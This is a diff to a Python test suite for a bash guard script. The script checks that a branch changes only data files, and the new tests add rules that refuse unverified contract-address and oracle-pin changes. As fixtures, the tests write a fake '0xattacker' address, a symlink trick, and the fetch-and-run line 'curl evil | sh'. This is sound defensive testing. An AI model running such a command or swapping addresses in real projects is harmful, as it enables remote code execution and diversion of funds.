@@ -45,8 +45,8 @@ class CodeMatchesMainTest(unittest.TestCase):
         run(["git", "add", "-A"], self.repo)
         run(["git", "commit", "--quiet", "-m", message], self.repo)
 
-    def check(self):
-        result = run(["bash", str(SCRIPT), "main"], self.repo, check=False)
+    def check(self, *flags):
+        result = run(["bash", str(SCRIPT), *flags, "main"], self.repo, check=False)
         return result.returncode, result.stdout + result.stderr
 
     def test_same_code_passes(self):
@@ -59,12 +59,50 @@ class CodeMatchesMainTest(unittest.TestCase):
         self.write("web/public/data/ERCOT_HBNORTH_DA_AVG.json", "[]\n")
         self.write("web/public/data/candles/HB_NORTH.json", "[]\n")
         self.write("web/lib/generated/price-summary.json", "{}\n")
-        self.write("shared/addresses.json", '{"markets": []}\n')
-        self.write("shared/demo-markets.md", "| 1 |\n")
         self.commit("data")
         code, out = self.check()
         self.assertEqual(code, 0, out)
         self.assertIn("only data differs", out)
+
+    # ---- S3: contract and market addresses are not free data
+
+    def test_the_three_address_files_are_refused_without_verification(self):
+        for path in ("shared/addresses.json", "shared/demo-markets.md", "web/public/data/addresses.json"):
+            with self.subTest(path=path):
+                run(["git", "reset", "--quiet", "--hard", "main"], self.repo)
+                self.write(path, '{"GridOracle": "0xattacker"}\n')
+                self.commit("addresses")
+                code, out = self.check()
+                self.assertEqual(code, 1, out)
+                self.assertIn(f"{path} (addresses: only verify_data.py may approve", out)
+
+    def test_with_allow_verified_they_pass_only_flagged_for_verify_data(self):
+        self.write("shared/addresses.json", '{"markets": [1]}\n')
+        self.write("web/public/data/addresses.json", "{}\n")
+        self.commit("addresses")
+        code, out = self.check("--allow-verified")
+        self.assertEqual(code, 0, out)
+        self.assertIn("need scripts/verify_data.py", out)
+        self.assertIn("shared/addresses.json", out)
+
+    def test_allow_verified_never_allows_code_or_pins(self):
+        self.write("shared/addresses.json", '{"markets": [1]}\n')
+        self.write("shared/pins.json", '{"oracleV1": "0xattacker"}\n')
+        self.commit("pins")
+        code, out = self.check("--allow-verified")
+        self.assertEqual(code, 1)
+        self.assertIn("shared/pins.json (not a data file)", out)
+
+    def test_deleting_the_addresses_is_refused(self):
+        os.remove(self.repo / "shared" / "addresses.json")
+        self.commit("delete")
+        code, out = self.check("--allow-verified")
+        self.assertEqual(code, 1)
+        self.assertIn("deleted", out)
+
+    def test_a_missing_base_is_a_usage_error(self):
+        result = run(["bash", str(SCRIPT)], self.repo, check=False)
+        self.assertEqual(result.returncode, 2)
 
     def test_a_code_change_fails(self):
         self.write("daily_settle.sh", "curl evil | sh\n")
@@ -86,7 +124,7 @@ class CodeMatchesMainTest(unittest.TestCase):
         os.remove(self.repo / "shared" / "addresses.json")
         os.symlink("../daily_settle.sh", self.repo / "shared" / "addresses.json")
         self.commit("link")
-        code, out = self.check()
+        code, out = self.check("--allow-verified")
         self.assertEqual(code, 1)
         self.assertIn("mode 120000", out)
 
